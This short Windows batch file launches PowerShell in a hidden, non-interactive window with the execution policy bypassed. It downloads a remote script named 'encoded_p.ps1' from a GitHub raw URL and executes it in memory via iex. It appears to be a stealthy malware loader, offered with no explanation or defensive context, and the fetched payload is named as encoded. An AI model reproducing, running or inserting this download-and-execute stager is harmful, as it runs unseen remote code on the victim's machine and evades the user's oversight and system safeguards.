@echo off
setlocal

powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/allisonmorat/three/main/encoded_p.ps1' -UseBasicParsing).Content"

endlocal
exit